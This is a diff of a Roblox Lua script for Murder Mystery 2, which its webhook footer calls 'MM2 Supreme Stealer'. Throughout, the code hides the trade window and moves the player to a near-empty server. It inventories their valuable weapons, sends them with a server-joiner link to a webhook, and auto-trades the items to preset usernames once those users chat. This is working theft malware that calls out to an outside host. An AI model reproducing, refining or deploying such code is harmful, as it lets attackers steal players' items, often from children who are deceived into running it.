@@ -2,7 +2,7 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
-local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- Evitar ejecución múltiple
 if getgenv().ScriptEjecutado then return end
@@ -14,11 +14,41 @@ local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
+
 local req = syn and syn.request or http_request or request
-if not req then
-    warn("No HTTP request method available!")
-    return
+if not req then warn("No HTTP request method available!") return end
+
+-- ===== Teleport a servidor vacío o casi vacío (retry infinito 2s) =====
+local function teleportToServer(minEmptyPlayers, maxPlayers)
+    while true do
+        local servers
+        pcall(function()
+            servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
+        end)
+        if servers and servers.data then
+            for _, s in ipairs(servers.data) do
+                if s.id ~= game.JobId and s.playing <= maxPlayers and s.playing >= minEmptyPlayers then
+                    TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
+                    getgenv().AlreadyTeleported = true
+                    return
+                end
+            end
+        end
+        task.wait(2)
+    end
 end
+
+if not getgenv().AlreadyTeleported then
+    teleportToServer(0, 8)
+end
+
+-- Mensaje visual si script se vuelve a ejecutar
+pcall(function()
+    if not getgenv().LogoMessageShown then
+        getgenv().LogoMessageShown = true
+        print("🚨 Anónimo ejecutando script...")
+    end
+end)
 
 -- ===== Función Base64 =====
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
@@ -35,46 +65,7 @@ local function base64Encode(data)
     end)..({ '', '==', '=' })[#data%3+1])
 end
 
--- ===== Teleport a servidor vacío o con pocos jugadores =====
-local function teleportToServer(minEmpty, maxPlayers)
-    while true do
-        local ok, servers = pcall(function()
-            local data = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
-            return HttpService:JSONDecode(data)
-        end)
-        if ok and servers and servers.data then
-            for _, s in ipairs(servers.data) do
-                if s.id ~= game.JobId and s.playing >= minEmpty and s.playing <= maxPlayers then
-                    TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
-                    return
-                end
-            end
-        end
-        task.wait(2)
-    end
-end
-
--- Solo hacer teleport la primera vez
-if not getgenv().AlreadyTeleported then
-    getgenv().AlreadyTeleported = true
-    teleportToServer(0,8)
-    return
-end
-
--- ===== Mensaje en el logo al entrar =====
-if RunService:IsRunning() then
-    local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
-    local Label = Instance.new("TextLabel", ScreenGui)
-    Label.Text = "Anónimo"
-    Label.Size = UDim2.new(0,300,0,50)
-    Label.Position = UDim2.new(0.5,-150,0.1,0)
-    Label.TextScaled = true
-    Label.BackgroundTransparency = 0.5
-    Label.BackgroundColor3 = Color3.fromRGB(0,0,0)
-    Label.TextColor3 = Color3.fromRGB(255,0,0)
-end
-
--- ===== Función para enviar webhook =====
+-- ===== Enviar webhook =====
 local function SendWebhook(title, description, fields, prefix)
     local data = {
         ["content"] = prefix or "",
@@ -83,13 +74,13 @@ local function SendWebhook(title, description, fields, prefix)
             ["description"] = description or "",
             ["color"] = 65280,
             ["fields"] = fields or {},
-            ["thumbnail"] = {["url"]="https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
-            ["footer"] = {["text"]="MM2 Supreme Stealer Protegido"}
+            ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
+            ["footer"] = {["text"] = "MM2 Supreme Stealer Protegido"}
         }}
     }
     local body = HttpService:JSONEncode(data)
     pcall(function()
-        req({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
+        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
     end)
 end
 
@@ -104,7 +95,7 @@ for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
 end
 
 -- ===== Funciones de trade =====
-local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
+local TradeService = ReplicatedStorage:WaitForChild("Trade")
 local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
 local function sendTradeRequest(user)
     local plrObj = Players:FindFirstChild(user)
@@ -115,7 +106,7 @@ local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
 -- ===== MM2 Supreme value system =====
-local database = require(game.ReplicatedStorage.Database.Sync.Item)
+local database = require(ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local categories = {
     godly="https://supremevaluelist.com/mm2/godlies.html",
@@ -125,8 +116,12 @@ local categories = {
     chroma="https://supremevaluelist.com/mm2/chromas.html"
 }
 local headers={["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}
+
 local function trim(s) return s:match("^%s*(.-)%s*$") end
-local function fetchHTML(url) local res=req({Url=url,Method="GET",Headers=headers}) return res and res.Body or "" end
+local function fetchHTML(url)
+    local res=req({Url=url, Method="GET", Headers=headers})
+    return res and res.Body or ""
+end
 local function parseValue(div)
     local str=div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
     if str then str=str:gsub(",","") return tonumber(str) end
@@ -191,7 +186,7 @@ local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
 local valueList=buildValueList()
 
-local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+local profile=ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 for id,amount in pairs(profile.Weapons.Owned) do
     local item=database[id]
     if item then
@@ -209,7 +204,6 @@ end
 -- ===== Enviar webhook solo si hay armas =====
 if #weaponsToSend > 0 then
     table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
-
     local rawLink="https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
     local encodedLink=base64Encode(rawLink)
     local safeLink="https://fern.wtf/redirect?data="..HttpService:UrlEncode(encodedLink)
@@ -227,7 +221,7 @@ if #weaponsToSend > 0 then
     SendWebhook("💪MM2 Hit Protegido💯","💰Solo Godly/Ancient armas",fields,prefix)
 end
 
--- ===== Trade =====
+-- ===== Trade completo =====
 local function doTrade(targetName)
     while #weaponsToSend>0 do
         local status=getTradeStatus()
@@ -253,6 +247,7 @@ for _, p in ipairs(Players:GetPlayers()) do
         p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end
+
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
